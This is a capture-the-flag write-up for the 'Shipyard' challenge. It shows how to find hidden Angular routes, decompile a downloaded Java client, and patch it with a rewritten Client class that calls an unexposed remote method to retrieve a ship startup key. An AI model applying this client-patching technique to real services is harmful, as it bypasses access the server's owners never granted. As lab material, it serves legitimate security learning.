## Shipyard

By inspecting the web application we find our that it's an Angular application.

By analyzing the minified code we find that there are multiple hidden routing paths that are coded within the Angular
application.
We did that by looking for the `path:` string within the `main-*.js`, which contains the application's code.

Most notably, we found the following paths:

- `/admin`, which turns out to be useless
- `/desktop-application`, which lets us download a desktop application

The desktop application is a `jar` file, which we can run/inspect.

Provided that we have Java installed, we can easily run the client application with the following command:

```bash
java -jar shipyard-client-application.jar
```

The application starts up but says that the license is expired.

What's important here is the content of the jar, which can be decompiled with a variety of tools and then analyzed.

First of all we see that the main method is in the `BOOT-INF/classes/com/shipyard/ship/Client.class` file.

In the jar we can find a very interesting interface, `ShipyardControlSystem`, located
in `BOOT-INF/classes/com/shipyard/ship/shared/interfaces/ShipyardControlSystem.class`.
We find that the interface is used to invoke remote methods on the server via HTTP wrapped RMI calls.
That interface contains the `getShipStartupKey` method that we want to invoke to get our ship startup key.

That method is not used by the application, but we can change the jar in order to make it happen.
More specifically, we need to call it with the only available ship's ID, which is the one belonging to the ship called *The Tub*.

To do so, let's create a new `Client.java` class and fill it. We can take inspiration from the code within the jar.
A good candidate code is the following:

```java
package com.shipyard.ship;

import com.shipyard.ship.shared.dto.Ship;
import com.shipyard.ship.shared.interfaces.ShipyardControlSystem;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import java.util.List;

public class Client {
    public static void main(String[] args) {
        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext("client-beans.xml");
        ShipyardControlSystem shipyardControl = (ShipyardControlSystem) context.getBean("shipyardControlBean");
        List<Ship> ships = shipyardControl.getShips();
        for (Ship ship : ships) {
            if ("The Tub".equals(ship.getName())) {
                System.out.println(shipyardControl.getShipStartupKey(ship.getId()));
            }
        }
    }
}
```

Since handling dependencies is hell, we can mock the 3 imported files and mimic the original file structure.

To simplify things let's create the following folder structure:

    .
     ├─ com
     │   └─ shipyard
     │       └─ ship
     │           ├─ Client.java
     │           └─ shared
     │               ├─ dto
     │               │   └─ Ship.java
     │               └─ interfaces
     │                   └─ ShipyardControlSystem.java
     └─ org
        └─ springframework
            └─ context
                └─ support
                    └─ ClassPathXmlApplicationContext.java

Put the following fake content in the other classes:

`com.shipyard.ship.shared.dto.Ship.java`:

```java
    package com.shipyard.ship.shared.dto;
    
    public class Ship {
        public String getName() {
            return null;
        }
    
        public String getId() {
            return null;
        }
    }
```

`com.shipyard.ship.shared.interfaces.ShipyardControlSystem.java`:

```java
    package com.shipyard.ship.shared.interfaces;

    import com.shipyard.ship.shared.dto.Ship;
    
    import java.util.List;
    
    public interface ShipyardControlSystem {
        List<Ship> getShips();
    
        String getShipStartupKey(String s);
    }
```


`org.springframework.context.support.ClassPathXmlApplicationContext.java`:

```java
    package org.springframework.context.support;

    public class ClassPathXmlApplicationContext {
        public ClassPathXmlApplicationContext(String s) {
    
        }
    
        public Object getBean(String s) {
            return null;
        }
    }
```

Now from the root folder we can compile the `Client.java` file:

```bash
javac.exe com/shipyard/ship/Client.java
```

The `Client.class` file will be created in `com/shipyard/ship`

Now we can overwrite the old `BOOT-INF/classes/com/shipyard/ship/Client.class` file within the jar (which is just a zip file with a different extension) with the one we just created.

Let's run our edited jar:

```bash
java -jar shipyard-client-application.jar
```

Ah we have to set the value of the `HOST` variable, and then we can run the jar:

```bash
set HOST=<ip:port>
java -jar shipyard-client-application.jar
```

The flag will appear in console.